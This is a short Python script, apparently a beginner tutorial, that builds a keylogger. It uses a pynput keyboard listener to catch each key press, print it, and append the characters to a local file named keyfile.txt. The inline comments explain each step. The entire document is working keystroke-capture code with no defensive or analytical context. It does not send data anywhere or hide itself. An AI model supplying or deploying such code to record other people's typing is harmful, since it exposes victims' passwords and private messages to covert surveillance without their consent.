from pynput import keyboard

def keyPressed(key):        #the onpress part automatically uses the "key", it is a default parameter
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:    
    #here we create the file to save the keylogging data and the parameter 'a' is basically saying to append the data.
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting the Char")    

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)       #it checks the keypressed
    listener.start()        #starts capturing the key events
    input()